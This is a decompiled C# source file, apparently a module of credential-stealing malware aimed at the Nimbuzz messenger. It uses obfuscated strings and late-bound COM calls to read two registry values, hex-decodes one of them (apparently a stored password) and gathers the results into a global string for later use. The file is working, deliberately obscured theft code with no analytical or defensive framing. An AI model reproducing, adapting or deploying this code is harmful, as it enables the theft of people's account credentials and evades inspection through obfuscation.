using System;
using System.Runtime.CompilerServices;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

public class DANMBZZ
{
	public class NMBZZdll
	{
		public static void nimmbuzz()
		{
			string text = "";
			string text2 = "";
			try
			{
				object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject(GOSLWHR.WHJBIYT("dq2ovqePrnOfpoSmsSo=", "False"), ""));
				text = Conversions.ToString(NewLateBinding.LateGet(objectValue, (Type)null, "RGRD", new object[1] { GOSLWHR.WHJBIYT("boyRrKRplp6linSVq6iYa5OoprSMtcO0t4udmryyiLbGzaF2hI+/rouvwK+GlrG4vKiHtbXCs4KWv7i3lKK5uCQ=", "False") }, (string[])null, (Type[])null, (bool[])null));
				text2 = HXASCI(Strings.Replace(Strings.Replace(Conversions.ToString(NewLateBinding.LateGet(objectValue, (Type)null, "RGRD", new object[1] { GOSLWHR.WHJBIYT("fJqfurJ3pKyzmIKjubameaG2tMKaw9HCxZmrqMrAlsTU26+Ekp3NvJm9zr2UpL/GyraVw8PQwZC/u9TGq77MxRY=", "False") }, (string[])null, (Type[])null, (bool[])null)), GOSLWHR.WHJBIYT("eJXX2bx5xdDG0GAP", "False"), "", 1, -1, (CompareMethod)0), GOSLWHR.WHJBIYT("WhY=", "False"), "", 1, -1, (CompareMethod)0));
				NTUIYURW.JGUON = GOSLWHR.WHJBIYT("X3qFjH5feoWMfl96lriuZLLCyX5feoWMfl96hYx+X3qFJw==", "False") + Environment.NewLine + Environment.NewLine + text + Environment.NewLine + text2 + Environment.NewLine + Environment.NewLine + GOSLWHR.WHJBIYT("bomUm41uiZSbjW6JlJuNbomUm41uiZSbjW6JlJuNbokX", "False");
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				NTUIYURW.JGUON = "";
				ProjectData.ClearProjectError();
			}
		}

		public static string HXASCI(string Text)
		{
			string result = default(string);
			try
			{
				object obj = null;
				object obj2 = default(object);
				object obj3 = default(object);
				if (ForLoopControl.ForLoopInitObj(obj2, (object)1, (object)Strings.Len(Text), (object)1, ref obj3, ref obj2))
				{
					do
					{
						object obj4 = Strings.Mid(Text, Conversions.ToInteger(obj2), 2);
						obj = Operators.ConcatenateObject(obj, (object)Strings.Chr(checked((int)Math.Round(Conversion.Val(Operators.ConcatenateObject((object)GOSLWHR.WHJBIYT("S6gj", "False"), obj4))))));
						obj2 = Operators.AddObject(obj2, (object)1);
					}
					while (ForLoopControl.ForNextCheckObj(obj2, obj3, ref obj2));
				}
				result = Conversions.ToString(obj);
				return result;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return result;
			}
		}

		public static string RGRD(string hKey)
		{
			string result = default(string);
			try
			{
				object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject(GOSLWHR.WHJBIYT("eZCrwaqSsXaiqYeptCc=", "False"), ""));
				object[] array = new object[1] { hKey };
				bool[] array2 = new bool[1] { true };
				object obj = NewLateBinding.LateGet(objectValue, (Type)null, "RGRD", array, (string[])null, (Type[])null, array2);
				if (array2[0])
				{
					hKey = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
				}
				result = Conversions.ToString(obj);
				return result;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}
}
